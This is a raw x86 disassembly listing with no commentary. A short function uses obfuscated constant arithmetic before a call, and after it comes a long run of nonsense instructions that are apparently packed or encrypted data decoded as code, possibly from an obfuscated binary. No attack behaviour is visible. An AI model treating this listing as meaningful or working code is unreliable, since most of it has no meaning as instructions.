  4205ab:	mov    ebp,esp
  4205ad:	sub    esp,0xc
  4205b0:	mov    eax,0xf89c8585
  4205b5:	mov    DWORD PTR [ebp-0x8],eax
  4205b8:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  4205bf:	mov    ecx,DWORD PTR [ebp-0x8]
  4205c2:	xor    ecx,0x751089b
  4205c8:	add    ecx,0x3272e2
  4205ce:	mov    DWORD PTR [ebp-0x4],ecx
  4205d1:	mov    ecx,DWORD PTR [ebp+0xc]
  4205d4:	push   eax
  4205d5:	mov    DWORD PTR [ebp+0xc],ecx
  4205d8:	push   DWORD PTR [ebp+0xc]
  4205db:	lea    eax,[ebp-0x4]
  4205de:	push   DWORD PTR [ebp+0x8]
  4205e1:	push   eax
  4205e2:	push   DWORD PTR [ebp+0xc]
  4205e5:	push   DWORD PTR [ebp-0xc]
  4205e8:	push   DWORD PTR [ebp-0x8]
  4205eb:	call   0x420433
  4205f0:	mov    DWORD PTR [ebp-0x4],eax
  4205f3:	mov    eax,DWORD PTR [ebp-0x4]
  4205f6:	leave  
  4205f7:	ret    0x8
  4205fa:	jg     0x4205b0
  4205fc:	jge    0xf741c5d1
  420602:	add    ebp,DWORD PTR [eax-0xa]
  420605:	sbb    dx,WORD PTR [esi]
  420608:	sub    ecx,edx
  42060a:	or     BYTE PTR [ebx+0x1fd0001],al
  420610:	add    BYTE PTR [eax],al
  420612:	leave  
  420613:	mov    cs,WORD PTR [edx-0x5c956742]
  420619:	mov    al,0x40
  42061b:	jl     0x4205ad
  42061d:	stos   DWORD PTR es:[edi],eax
  42061e:	in     al,0xa0
  420620:	dec    eax
  420621:	loopne 0x4205c5
  420623:	mov    edx,eax
  420625:	neg    DWORD PTR [ebx+0x68]
  420628:	test   BYTE PTR [edx+0x5da3fcbb],0x4
  42062f:	mov    cl,0x34
  420631:	pushf  
  420632:	shl    ah,cl
  420634:	cmp    ch,BYTE PTR [edi+eiz*4+0x7b]
  420638:	imul   DWORD PTR [eax-0x28]
  42063b:	les    ebx,FWORD PTR [ebx+ebx*1]
  42063e:	mul    DWORD PTR [edi+0x55]
  420641:	or     eax,DWORD PTR [eax-0x36926aa9]
  420647:	xlat   BYTE PTR ds:[ebx]
  420648:	xchg   DWORD PTR [ebx-0x6dea8f56],ebp
  42064e:	jno    0x4206ca
  420650:	pop    esi
  420651:	hlt    
  420652:	pop    edi
  420653:	sbb    al,0xec
  420655:	mov    ch,0xe7
  420657:	lock call 0x298e2401
  42065d:	stc    
  42065e:	sub    al,0xe1
  420660:	and    ebp,DWORD PTR [edx]
  420662:	sub    DWORD PTR [ebx+0x3f],ebp
  420665:	jno    0x4206b0
  420667:	pop    ss
  420668:	test   DWORD PTR cs:[edx+0x6ba99760],edx
  42066f:	jns    0x420691
  420671:	pop    ds
  420672:	pop    esi
  420673:	popa   
  420674:	jecxz  0x420603
  420676:	rcl    DWORD PTR [ebx],0xcd
  420679:	sub    ch,BYTE PTR [eax-0x1b7d8e2]
  42067f:	push   ebp
  420680:	mov    al,ds:0x8f4af8fa
  420685:	pop    es
  420686:	mov    ebp,0xad6a4517
  42068b:	or     eax,0x171aae47
  420690:	cmp    edi,DWORD PTR [ebp-0x23]
  420693:	adc    ch,ch
  420695:	adc    cl,dh
  420697:	mov    bh,0xc0
  420699:	add    dh,BYTE PTR [ebx-0x53]
  42069c:	outs   dx,BYTE PTR ds:[esi]
  42069d:	adc    eax,0xde82f893
  4206a2:	xchg   edx,eax
  4206a3:	or     eax,0xb1c24e81
  4206a8:	(bad)  
  4206a9:	int3   
  4206aa:	jno    0x4206b5
  4206ac:	or     cl,cl
  4206ae:	xchg   ecx,eax
  4206af:	mov    bh,0x9b
  4206b1:	dec    esi
  4206b2:	inc    edi
  4206b3:	sti    
  4206b4:	push   eax
  4206b5:	leave  
  4206b6:	ss cmp eax,0x2a456419
  4206bc:	jbe    0x420703
  4206be:	xor    DWORD PTR ss:[ecx-0x2300e224],edx
  4206c5:	mov    bl,0x91
  4206c7:	cmc    
  4206c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4206c9:	adc    esi,DWORD PTR [esp+ecx*8+0x393b3100]
  4206d0:	icebp  
  4206d1:	mov    dl,0xe7
  4206d3:	mov    ds:0xa9f44e6d,eax
  4206d8:	out    dx,eax
  4206d9:	mov    ch,0x59
  4206db:	inc    ecx
  4206dc:	pop    edi
  4206dd:	aas    
  4206de:	je     0x4206dc
  4206e0:	dec    eax
  4206e1:	push   0x1d9f744f
  4206e6:	test   DWORD PTR [edi],edx
  4206e8:	pop    ebx
  4206e9:	fiadd  WORD PTR [ebx-0x73]
  4206ec:	mov    esi,edi
  4206ee:	fadd   DWORD PTR [esi]
  4206f0:	pop    ecx
  4206f1:	sti    
  4206f2:	outs   dx,BYTE PTR ds:[esi]
  4206f3:	push   edx
  4206f4:	and    BYTE PTR [ecx],ah
  4206f6:	jne    0x420706
  4206f8:	add    BYTE PTR [edi+0x2c],0x7
  4206fc:	cmp    BYTE PTR es:[eax-0x57],ch
  420700:	add    DWORD PTR [ebx+0x64],0x1f
  420704:	enter  0xea7d,0x42
  420708:	jp     0x420771
  42070a:	cmp    ah,BYTE PTR [edi+0x71]
  42070d:	mov    ds:0x401c8bd7,eax
  420712:	mov    ch,0x54
  420714:	ret    0x67d7
  420717:	loopne 0x420735
  420719:	call   0xda3b4d57
  42071e:	push   esp
  42071f:	aas    
  420720:	pop    ebp
  420721:	add    DWORD PTR [ebx],eax
  420723:	jmp    0x420701
  420725:	jae    0x4206a8
  420727:	out    dx,eax
  420728:	cmp    BYTE PTR [esi+ebp*4-0x27b3c329],dh
  42072f:	mov    cl,0x80
  420731:	cmp    DWORD PTR [ebx+0x31374a72],0x1f
  420738:	sub    DWORD PTR [ebp-0x792dfc3f],0x3166b329
  420742:	adc    eax,0x69ead227
  420747:	hlt    
  420748:	mov    BYTE PTR [ebp-0x3d],ah
  42074b:	jae    0x4206fb
  42074d:	sub    ebp,DWORD PTR [eax]
  42074f:	add    eax,0xa3a6187d
  420754:	retf   0x4f4a
  420757:	ds xchg ebp,eax
  420759:	xchg   esi,eax
  42075a:	push   0x2442ab8e
  42075f:	push   esp
  420760:	lods   al,BYTE PTR ds:[esi]
  420761:	or     eax,0x5448df1c
  420766:	sbb    ch,dl
  420768:	cld    
  420769:	xchg   esp,eax
  42076a:	pushf  
  42076b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42076c:	lock sbb eax,0xf74b1d03
  420772:	dec    ebp
  420773:	in     al,dx
  420774:	push   edi
  420775:	lods   eax,DWORD PTR ds:[esi]
  420776:	or     ch,0xf8
  420779:	jg     0x4207f3
  42077b:	xchg   esp,eax
  42077c:	scas   eax,DWORD PTR es:[edi]
  42077d:	dec    edi
  42077e:	pop    ecx
  42077f:	sub    eax,0x40886312
  420784:	enter  0x3a01,0x8f
  420788:	sbb    eax,0x6db7030b
  42078d:	cmp    DWORD PTR [ebp-0x343ff851],ecx
  420793:	je     0x420797
  420795:	mov    edi,0x2679b959
  42079a:	sub    dh,BYTE PTR [ebp+0x31]
  42079d:	sbb    al,0xb6
  42079f:	std    
  4207a0:	mov    WORD PTR [ecx],?
  4207a2:	out    0x70,eax
  4207a4:	aam    0xae
  4207a6:	loopne 0x420792
  4207a8:	mov    ebx,DWORD PTR [ecx+ebp*8+0x5]
  4207ac:	int    0x60
  4207ae:	aaa    
  4207af:	dec    esi
  4207b0:	(bad)  
  4207b1:	fisubr WORD PTR [edx-0x5d628f48]
  4207b7:	and    al,0x66
  4207b9:	ret    
  4207ba:	mov    DWORD PTR [ebp+0x31],ebx
  4207bd:	add    eax,0x531ca861
  4207c2:	inc    ebx
  4207c3:	adc    al,0xe3
  4207c5:	jp     0x4207ef
  4207c7:	xor    eax,0x2803efa5
  4207cc:	push   eax
  4207cd:	push   ecx
  4207ce:	and    al,0xab
  4207d0:	aad    0xe1
  4207d2:	cmc    
  4207d3:	in     al,dx
  4207d4:	push   0x7d
  4207d6:	push   0x2c
  4207d8:	jle    0x42076f
  4207da:	add    esi,DWORD PTR [edi]
  4207dc:	out    dx,al
  4207dd:	leave  
  4207de:	dec    ebp
  4207df:	cdq    
  4207e0:	scas   al,BYTE PTR es:[edi]
  4207e1:	mov    ebx,0x8f49e676
  4207e6:	sub    DWORD PTR [ecx],edi
  4207e8:	sbb    dl,BYTE PTR [esi+0x5906cd16]
  4207ee:	or     edx,ebx
  4207f0:	mov    ecx,ebx
  4207f2:	or     ebx,0xe72585d8
  4207f8:	mov    bh,ch
  4207fa:	inc    edx
  4207fb:	add    BYTE PTR [esi+edx*2+0x641c0dac],bl
  420802:	jmp    DWORD PTR [ebx]
  420804:	jmp    0xdb79:0x56a5409d
  42080b:	and    bh,cl
  42080d:	sbb    al,0x59
	...
  420817:	add    BYTE PTR [eax],al
  420819:	add    BYTE PTR [edi+0x4c],dh
  42081c:	idiv   dh
  42081e:	(bad)  
  42081f:	(bad)  
  420820:	jg     0x4207ef
  420822:	mul    BYTE PTR [ebx+0x41272ffd]
  420828:	repz daa 
  42082a:	add    eax,0xfd000185
  42082f:	add    DWORD PTR [eax],eax
  420831:	add    al,ch
  420833:	push   ecx
  420834:	push   ds
  420835:	jmp    0xf4e4:0x402a6dd5
  42083c:	std    
  42083d:	mov    dl,0x73
  42083f:	and    al,0x95
  420841:	sub    BYTE PTR [eax],al
  420843:	jecxz  0x4207e7
  420845:	cmp    ch,0x45
  420848:	mov    ah,0xba
  42084a:	jb     0x4207dc
  42084c:	aas    
  42084d:	jmp    0x578e306b
  420852:	fucom  st(2)
  420854:	jle    0x42086f
  420856:	push   eax
  420857:	clc    
  420858:	jae    0x420833
  42085a:	cld    
  42085b:	jp     0x4207f1
  42085d:	mov    eax,0x680e0c
  420863:	and    DWORD PTR [esi-0x5353f015],0x96e88a73
  42086d:	mov    ebx,0xec3d2ed9
  420872:	jne    0x420834
  420874:	call   0xa4ce:0x500027ad
  42087b:	hlt    
  42087c:	push   edx
  42087d:	popf   
  42087e:	mov    ds:0x9af750b,al
  420883:	(bad)  
  420884:	pop    ss
  420885:	pop    ecx
  420886:	xlat   BYTE PTR ds:[ebx]
  420887:	mov    ds:0x9c5830de,al
  42088c:	fcomp  st(5)
  42088e:	stos   BYTE PTR es:[edi],al
  42088f:	or     dl,ah
  420891:	xchg   dl,dh
  420893:	pusha  
  420894:	adc    ebp,ebx
  420896:	cli    
  420897:	cmc    
  420898:	(bad)  [edi+0x17b153f4]
  42089e:	cdq    
  42089f:	popf   
  4208a0:	or     esp,DWORD PTR [ebp+0x267aad1b]
  4208a6:	clc    
  4208a7:	nop
  4208a8:	and    BYTE PTR [ebx+0x70d75b60],al
  4208ae:	or     BYTE PTR [edx+0x11],cl
  4208b1:	or     eax,edi
  4208b3:	fcom   st(3)
  4208b5:	int3   
  4208b6:	add    ebp,ecx
  4208b8:	dec    ecx
  4208b9:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4208bb:	jecxz  0x420871
  4208bd:	xchg   esp,eax
  4208be:	inc    ecx
  4208bf:	mov    dh,0xf8
  4208c1:	xor    al,BYTE PTR [edi-0x31]
  4208c4:	stos   BYTE PTR es:[edi],al
  4208c5:	pusha  
  4208c6:	and    al,0x3b
  4208c8:	adc    al,0x5
  4208ca:	adc    bh,ah
  4208cc:	das    
  4208cd:	jle    0x4208b1
  4208cf:	out    dx,eax
  4208d0:	mov    cl,0xeb
  4208d2:	push   edi
  4208d3:	pop    es
  4208d4:	in     al,0xbc
  4208d6:	stos   DWORD PTR es:[edi],eax
  4208d7:	and    eax,0x3291c97e
  4208dc:	mov    bl,0xbe
  4208de:	(bad)  
  4208df:	call   0x3c52:0xb469c665
  4208e6:	je     0x4208c6
  4208e8:	nop
  4208e9:	sbb    BYTE PTR [ebx-0x56],dl
  4208ec:	add    ch,dh
  4208ee:	(bad)  
  4208ef:	ja     0x420885
  4208f1:	adc    DWORD PTR [ebx-0x6a],edx
  4208f4:	stc    
  4208f5:	mov    ds:0x30cdbaac,eax
  4208fa:	call   0x4b53b4b0
  4208ff:	sub    al,0xc
  420901:	dec    esi
  420902:	scas   al,BYTE PTR es:[edi]
  420903:	rcr    BYTE PTR [bx+0x78],1
  420907:	dec    edi
  420908:	and    BYTE PTR ss:[esi],cl
  42090b:	and    DWORD PTR ds:0x91e0383d,ecx
  420911:	in     al,dx
  420912:	mov    bh,0x1e
  420914:	xchg   esp,eax
  420915:	bound  esi,QWORD PTR [ebx]
  420917:	sbb    ebp,DWORD PTR [eax-0x33]
  42091a:	jmp    0x9c82:0xcd8b2dfc
  420921:	call   0x17ac8881
  420926:	mov    ds,WORD PTR [esi+0x23f82cf2]
  42092c:	cmp    bh,BYTE PTR [esi+0x5]
  42092f:	add    esp,DWORD PTR [edi+0x1e]
  420932:	adc    BYTE PTR [ebx+eiz*4-0xa],0x6a
  420937:	xchg   ebx,eax
  420938:	aam    0x2a
  42093a:	jbe    0x420975
  42093c:	xor    DWORD PTR [ecx-0x4dbc58f7],ebx
  420942:	add    BYTE PTR [ebp-0x46],dl
  420945:	ror    bh,0xd1
  420948:	mov    ds:0xecc6e085,al
  42094d:	mov    ch,0xc1
  42094f:	ficomp DWORD PTR [ebx+0x1b]
  420952:	xor    DWORD PTR [edi],ebx
  420954:	ror    DWORD PTR [edx-0x28],0xf7
  420958:	push   0xfffffffd
  42095a:	pop    ds
  42095b:	fisttp DWORD PTR [esi+0x7a]
  42095e:	fld    TBYTE PTR [ebx+0x56f58a1e]
  420964:	or     ebx,DWORD PTR [ebp-0x1f4debd6]
  42096a:	hlt    
  42096b:	pop    esi
  42096c:	pushf  
  42096d:	dec    eax
  42096e:	dec    esi
  42096f:	clc    
  420970:	hlt    
  420971:	cs push dx
  420974:	in     eax,0x4b
  420976:	mov    dh,0xe3
  420978:	jmp    FWORD PTR [ebp+0x7a]
  42097b:	pop    eax
  42097c:	scas   eax,DWORD PTR es:[edi]
  42097d:	(bad)  
  42097e:	sbb    BYTE PTR [ebx-0x26aa19df],dl
  420984:	inc    ebx
  420985:	nop
  420986:	adc    BYTE PTR [edx+0x2f],dh
  420989:	mov    bl,0xc6
  42098b:	jmp    FWORD PTR [edx+0x351580d7]
  420991:	mov    ebx,0xad82002d
  420996:	jg     0x42091d
  420998:	popf   
  420999:	or     esp,DWORD PTR [edx-0x544a56dc]
  42099f:	inc    ecx
  4209a0:	arpl   WORD PTR [ebp-0x63],bp
  4209a3:	loopne 0x4209be
  4209a5:	fidiv  DWORD PTR [esi]
  4209a7:	mov    al,0x59
  4209a9:	lock std 
  4209ab:	and    eax,0xd4e1917
  4209b0:	popf   
  4209b1:	loopne 0x420989
  4209b3:	call   0x892d:0x256a7980
  4209ba:	mov    edi,0x552308b8
  4209bf:	xor    bl,bh
  4209c1:	inc    edi
  4209c2:	and    DWORD PTR [ecx-0x3e],ebx
  4209c5:	test   eax,0xcec3464f
  4209ca:	mov    bl,0x46
  4209cc:	pop    edi
  4209cd:	inc    ebp
  4209ce:	and    dl,bh
  4209d0:	retf   0x8c31
  4209d3:	cmp    ecx,eax
  4209d5:	push   ds
  4209d6:	push   ss
  4209d7:	xchg   DWORD PTR [ecx+0x593f8b24],eax
  4209dd:	mov    bl,0xa2
  4209df:	pop    esi
  4209e0:	mov    esp,0x68a4d7ab
  4209e5:	add    eax,0x594d52ab
  4209ea:	jg     0x4209d8
  4209ec:	in     eax,dx
  4209ed:	sar    BYTE PTR [eax-0x3dd97e8f],0xfc
  4209f4:	lods   eax,DWORD PTR ds:[esi]
  4209f5:	dec    edi
  4209f6:	dec    ecx
  4209f7:	in     al,dx
  4209f8:	cwde   
  4209f9:	(bad)  
  4209fa:	hlt    
  4209fb:	inc    esp
  4209fc:	scas   eax,DWORD PTR es:[edi]
  4209fd:	dec    eax
  4209fe:	push   eax
  4209ff:	in     al,0xf2
  420a01:	stc    
  420a02:	mov    dl,0x14
  420a04:	aas    
  420a05:	int3   
  420a06:	rcl    BYTE PTR [edx-0x15628a5e],0x7a
  420a0d:	lahf   
  420a0e:	add    DWORD PTR [edi-0x4b],ebx
  420a11:	sub    DWORD PTR [ebx-0x6e9e09e4],esi
  420a17:	ins    DWORD PTR es:[edi],dx
  420a18:	xchg   esi,eax
  420a19:	call   0x8ca24d14
  420a1e:	sbb    al,0xeb
  420a20:	int3   
  420a21:	add    al,0x22
  420a23:	dec    edx
  420a24:	dec    ebp
  420a25:	fstp   TBYTE PTR [ecx+0x3d]
  420a28:	fwait
  420a29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a2a:	lds    edi,FWORD PTR [ecx+0xed64e8]
	...
  420a38:	add    BYTE PTR [eax],al
  420a3a:	pop    es
  420a3b:	sbb    cl,BYTE PTR [ecx-0x686462e6]
  420a41:	pop    ds
  420a42:	(bad)  
  420a44:	std    
  420a45:	jg     0x420a26
  420a47:	jnp    0x4209d5
  420a49:	add    DWORD PTR [edx],0xffffff87
  420a4c:	add    DWORD PTR [eax],eax
  420a4e:	std    
  420a4f:	add    DWORD PTR [eax],eax
  420a51:	add    ah,al
  420a53:	sti    
  420a54:	data16 sbb ah,ah
  420a57:	adc    DWORD PTR [ecx+0x67b0c6f4],eax
  420a5d:	jle    0x4209e1
  420a5f:	sbb    BYTE PTR [eax+0x50],dh
  420a62:	dec    ebx
  420a63:	das    
  420a64:	(bad)  [ebx]
  420a66:	cmp    DWORD PTR [ecx],edx
  420a68:	jbe    0x420a69
  420a6a:	add    esi,esi
  420a6c:	add    al,0xf3
  420a6e:	leave  
  420a6f:	and    ebx,DWORD PTR [esp+ecx*1-0x300b3af1]
  420a76:	bound  esi,QWORD PTR [ebx+0x28cfd231]
  420a7c:	push   esp
  420a7d:	jge    0x420a3b
  420a7f:	in     eax,dx
  420a80:	dec    edi
  420a81:	xor    dh,BYTE PTR [eax-0x7921ee58]
  420a87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a88:	shl    BYTE PTR [ebx-0x1a],0xce
  420a8c:	xchg   DWORD PTR [esi-0x1bc656a6],ecx
  420a92:	dec    edx
  420a93:	loope  0x420b11
  420a95:	add    al,0x5
  420a97:	inc    eax
  420a98:	nop
  420a99:	fldcw  WORD PTR [eax]
  420a9b:	sar    BYTE PTR [edi-0x7b17c0df],0xb7
  420aa2:	xchg   ecx,eax
  420aa3:	pop    ecx
  420aa4:	add    DWORD PTR [esp+edx*4-0x63ca5724],0x6cae547f
  420aaf:	mov    ds:0xa4552657,eax
  420ab4:	inc    ebp
  420ab5:	(bad)  
  420ab6:	out    dx,eax
  420ab7:	loope  0x420a98
  420ab9:	(bad)  
  420aba:	fisub  WORD PTR [esi]
  420abc:	pop    ebx
  420abd:	sbb    DWORD PTR [edx-0x65793ec0],ebp
  420ac3:	jp     0x420b2b
  420ac5:	fadd   QWORD PTR [ecx-0x80]
  420ac8:	hlt    
  420ac9:	daa    
  420aca:	adc    DWORD PTR ds:0x6e36ab5c,edx
  420ad0:	sbb    DWORD PTR [ebx-0x69],ebp
  420ad3:	aam    0xa1
  420ad5:	push   ebx
  420ad6:	push   esp
  420ad7:	mov    esi,0xbeebac39
  420adc:	imul   esp,DWORD PTR [edx+ebp*1],0x801aa5a8
  420ae3:	cmp    ah,bh
  420ae5:	add    ebp,DWORD PTR [edx-0x50]
  420ae8:	test   DWORD PTR [ebx+0x72200d16],esi
  420aee:	jno    0x420af0
  420af0:	scas   al,BYTE PTR es:[edi]
  420af1:	jno    0x420b1e
  420af3:	xchg   esi,eax
  420af4:	bound  ebx,QWORD PTR [ecx-0x2]
  420af7:	xor    ebp,DWORD PTR [eax-0x51]
  420afa:	jae    0x420b10
  420afc:	pop    ds
  420afd:	cld    
  420afe:	hlt    
  420aff:	dec    DWORD PTR [edx-0x6d]
  420b02:	leave  
  420b03:	(bad)  
  420b04:	sbb    al,0x88
  420b06:	push   es
  420b07:	dec    edi
  420b08:	pop    esi
  420b09:	out    dx,al
  420b0a:	(bad)  
  420b0b:	mov    cl,0x67
  420b0d:	cmp    eax,0x2c6d9ad3
  420b12:	ss sbb eax,0xfe48d844
  420b18:	mov    BYTE PTR cs:[ecx-0x3b7fb02c],ah
  420b1f:	xor    DWORD PTR [ebp+0x68],0xffffff95
  420b23:	popf   
  420b24:	and    dl,BYTE PTR [esp+esi*2-0xa8a62be]
  420b2b:	push   0x25e7e92c
  420b30:	add    BYTE PTR [ebx+0xe3324e0],dl
  420b36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b37:	out    0x45,al
  420b39:	(bad)  
  420b3a:	in     al,0xb
  420b3c:	out    dx,eax
  420b3d:	and    ecx,DWORD PTR [edx+0x10a1fd69]
  420b43:	imul   ebx,DWORD PTR [edi+edx*1-0x47],0x25
  420b48:	push   ebx
  420b49:	lods   al,BYTE PTR ds:[esi]
  420b4a:	push   ebx
  420b4b:	push   esp
  420b4c:	sbb    edx,0x6133ad0e
  420b52:	xchg   esi,eax
  420b53:	ret    0x2b7f
  420b56:	mul    ebx
  420b58:	jns    0x420bd0
  420b5a:	cmp    BYTE PTR es:[ecx+0x7],cl
  420b5e:	push   ebp
  420b5f:	xchg   esi,eax
  420b60:	jle    0x420bcc
  420b62:	cli    
  420b63:	imul   ecx,DWORD PTR [ecx+0x5e33c1e4],0xffffffc7
  420b6a:	pop    esi
  420b6b:	(bad)  
  420b6c:	jle    0x420baf
  420b6e:	aam    0xd6
  420b70:	lods   eax,DWORD PTR ds:[esi]
  420b71:	inc    edx
  420b72:	dec    esi
  420b73:	dec    ecx
  420b74:	jno    0x420bab
  420b76:	jle    0x420bc1
  420b78:	inc    eax
  420b79:	and    eax,DWORD PTR [ebx+0x17]
  420b7c:	xor    al,0x3d
  420b7e:	adc    eax,ecx
  420b80:	and    eax,DWORD PTR [ecx-0x1c]
  420b83:	and    DWORD PTR [eax],0x51
  420b86:	xor    eax,0xe5e6cf83
  420b8b:	lods   al,BYTE PTR ds:[esi]
  420b8c:	and    bh,cl
  420b8e:	mov    al,ds:0x24489a24
  420b93:	pop    esp
  420b94:	neg    ebx
  420b96:	out    0x9f,al
  420b98:	setg   BYTE PTR [ebp+0x6246def3]
  420b9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ba0:	sbb    bl,BYTE PTR [edx]
  420ba2:	dec    esp
  420ba3:	or     dh,0x5e
  420ba6:	out    0x32,eax
  420ba8:	out    dx,al
  420ba9:	mov    edx,ebx
  420bab:	xchg   edi,eax
  420bac:	inc    edi
  420bad:	mov    bl,0xd
  420baf:	hlt    
  420bb0:	xor    esi,DWORD PTR [ebp-0x24c819e4]
  420bb6:	sbb    dl,dh
  420bb8:	fild   QWORD PTR [edi+0x76]
  420bbb:	xchg   ebp,eax
  420bbc:	or     BYTE PTR [ebx-0x7e],0x75
  420bc0:	call   0xd399d47f
  420bc5:	jmp    0xd6d26005
  420bca:	(bad)  
  420bcb:	mov    al,0xbc
  420bcd:	fisubr WORD PTR [esi]
  420bcf:	into   
  420bd0:	ror    DWORD PTR [edx],1
  420bd2:	xchg   esp,eax
  420bd3:	inc    esi
  420bd4:	jo     0x420be5
  420bd6:	iret   
  420bd7:	outs   dx,DWORD PTR ds:[esi]
  420bd8:	mov    eax,0x9388b16
  420bdd:	call   0x2f3c:0x90c845b6
  420be4:	xor    eax,0x70e3b0b3
  420be9:	inc    esp
  420bea:	int3   
  420beb:	adc    DWORD PTR [edi+0x72e76f2f],0xf023770
  420bf5:	cs xchg ecx,eax
  420bf7:	mov    ebp,DWORD PTR [ebp+0x2f]
  420bfa:	mov    al,BYTE PTR [edx-0x1f336c73]
  420c00:	sub    edx,DWORD PTR [ecx+edi*2-0x25f78dda]
  420c07:	mov    bh,0x1a
  420c09:	pop    esp
  420c0a:	sar    BYTE PTR [ecx+0x14],cl
  420c0d:	pop    esi
  420c0e:	mov    edx,0x6b559d0
  420c13:	adc    edi,ebp
  420c15:	imul   edx,eax,0xf6f7468
  420c1b:	lahf   
  420c1c:	int    0x22
  420c1e:	sar    BYTE PTR [eax],cl
  420c20:	mov    dh,0xca
  420c22:	mov    ds,WORD PTR [ecx+0x4]
  420c25:	retf   0xd35e
  420c28:	or     eax,ebx
  420c2a:	inc    edx
  420c2b:	inc    ebp
  420c2c:	xchg   bh,bh
  420c2e:	pop    ss
  420c2f:	mov    dl,0xfd
  420c31:	xor    eax,DWORD PTR [edi+0x774987b5]
  420c37:	push   0xffffffbd
  420c39:	inc    esi
  420c3a:	push   edi
  420c3b:	mov    edx,0xf0cc2224
  420c40:	lds    esi,FWORD PTR [ebx]
  420c42:	daa    
  420c43:	sti    
  420c44:	mov    dh,0x2a
  420c46:	xchg   ebp,eax
  420c47:	dec    eax
  420c48:	jl     0x420c98
  420c4a:	out    dx,al
  420c4b:	sub    DWORD PTR [edx+0xa7b],0x0
  420c55:	add    BYTE PTR [eax],al
  420c57:	add    BYTE PTR [eax],al
  420c59:	add    BYTE PTR [esi],bl
  420c5b:	add    al,0xa7
  420c5d:	(bad)  
  420c5e:	mov    edi,0x7bdd7ee7
  420c63:	int    0x75
  420c65:	mov    WORD PTR [esi+0x38],?
  420c68:	push   0xffffffbd
  420c6a:	dec    DWORD PTR [eax+0x1fd0001]
  420c70:	add    BYTE PTR [eax],al
  420c72:	addr16 and eax,0x7c9f46d8
  420c78:	retf   0xb062
  420c7b:	pop    ds
  420c7c:	je     0x420c42
  420c7e:	sub    eax,0x91889639
  420c83:	icebp  
  420c84:	aas    
  420c85:	lods   al,BYTE PTR ds:[esi]
  420c86:	jl     0xb197e3b5
  420c8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c8d:	xor    eax,0xd403287c
  420c92:	push   edi
  420c93:	dec    edx
  420c94:	rcr    DWORD PTR [ebx+ebx*4+0x55fb234d],0x3c
  420c9c:	sub    DWORD PTR [ebp+0x36],ebp
  420c9f:	(bad)  
  420ca0:	fimul  WORD PTR [ebx-0x7f]
  420ca3:	xchg   DWORD PTR [ecx],esp
  420ca5:	or     bl,BYTE PTR [esi+0x1a]
  420ca8:	or     eax,0xb12b04d3
  420cad:	push   ebp
  420cae:	fbld   TBYTE PTR [eax+0x30413b55]
  420cb4:	shr    DWORD PTR [ebx+0x6f88096e],1
  420cba:	sbb    al,0x57
  420cbc:	sbb    al,BYTE PTR cs:[ebx]
  420cbf:	sbb    dl,BYTE PTR [ecx]
  420cc1:	xor    DWORD PTR ds:0xd38ba1fc,esp
  420cc7:	pop    ds
  420cc8:	loop   0x420d32
  420cca:	scas   al,BYTE PTR es:[edi]
  420ccb:	out    dx,al
  420ccc:	iret   
  420ccd:	retf   0x58e8
  420cd0:	pop    ss
  420cd1:	popa   
  420cd2:	stos   DWORD PTR es:[edi],eax
  420cd3:	leave  
  420cd4:	sub    DWORD PTR [edx+0xc3b0456],ecx
  420cda:	dec    edi
  420cdb:	outs   dx,BYTE PTR ds:[esi]
  420cdc:	jmp    DWORD PTR [edx+0x172ec8e7]
  420ce2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ce3:	test   DWORD PTR [ebx-0x3c],ecx
  420ce6:	out    0x4e,eax
  420ce8:	mov    DWORD PTR [bp+si+0xb],esi
  420cec:	push   sp
  420cee:	int3   
  420cef:	xchg   edi,eax
  420cf0:	addr16 retf 0x32f9
  420cf4:	test   al,0xf3
  420cf6:	fistp  DWORD PTR [edx]
  420cf8:	sbb    al,0xd4
  420cfa:	(bad)  
  420cfb:	sub    al,0xf6
  420cfd:	test   DWORD PTR [esi-0x572f6e94],eax
  420d03:	aaa    
  420d04:	mov    al,ds:0xafdd30f2
  420d09:	jmp    0xd626f026
  420d0e:	ins    DWORD PTR es:[edi],dx
  420d0f:	xor    eax,0x8b503fac
  420d14:	xor    al,0x74
  420d16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d17:	aad    0xba
  420d19:	imul   ebp,DWORD PTR [edi+0x72],0x68e66a7e
  420d20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d21:	inc    ebp
  420d22:	pop    eax
  420d23:	cmp    eax,DWORD PTR [edi]
  420d25:	outs   dx,DWORD PTR ds:[esi]
  420d26:	fnstcw WORD PTR [edx-0x59]
  420d29:	or     eax,0x13a48519
  420d2e:	ds push ss
  420d30:	jno    0x420d4b
  420d32:	xor    BYTE PTR [ebx+0x71],al
  420d35:	pushf  
  420d36:	iret   
  420d37:	dec    esi
  420d38:	sbb    BYTE PTR [esi-0x17575f8],dh
  420d3e:	out    dx,eax
  420d3f:	scas   al,BYTE PTR es:[edi]
  420d40:	pop    edi
  420d41:	adc    BYTE PTR [eax+0x55],al
  420d44:	ret    0xad07
  420d47:	or     eax,0xdbcb22c6
  420d4c:	fs pop es
  420d4e:	dec    ebx
  420d4f:	inc    ebp
  420d50:	xlat   BYTE PTR ds:[ebx]
  420d51:	pusha  
  420d52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d54:	rsm    
  420d56:	dec    ebx
  420d57:	leave  
  420d58:	retf   
  420d59:	jne    0x420d2a
  420d5b:	xor    cl,BYTE PTR [eax]
  420d5d:	shl    DWORD PTR [edi+eiz*8],1
  420d60:	mov    bl,0x9c
  420d62:	pop    es
  420d63:	ds scas al,BYTE PTR es:[edi]
  420d65:	pop    eax
  420d66:	cmc    
  420d67:	leave  
  420d68:	sbb    cl,0x54
  420d6b:	(bad)  
  420d6c:	xchg   edi,eax
  420d6d:	pop    esp
  420d6e:	mov    eax,ds:0x20379be5
  420d73:	inc    ecx
  420d74:	jb     0x420d21
  420d76:	(bad)  
  420d77:	rcr    DWORD PTR [edi+ecx*1],1
